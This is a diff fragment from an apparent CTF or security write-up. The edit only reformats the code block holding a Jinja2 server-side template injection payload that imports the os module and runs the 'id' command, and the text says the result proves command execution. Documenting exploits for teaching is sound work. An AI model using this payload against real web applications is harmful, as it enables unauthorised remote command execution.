@@ -46,9 +46,9 @@ Based on the user’s URL, the website will directly copy the content and print 
 
 ## Time to Exploit!
 
-```sh
+````
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-```
+````
 
 The result shows that we can access the os library and execute the **id** command.
 
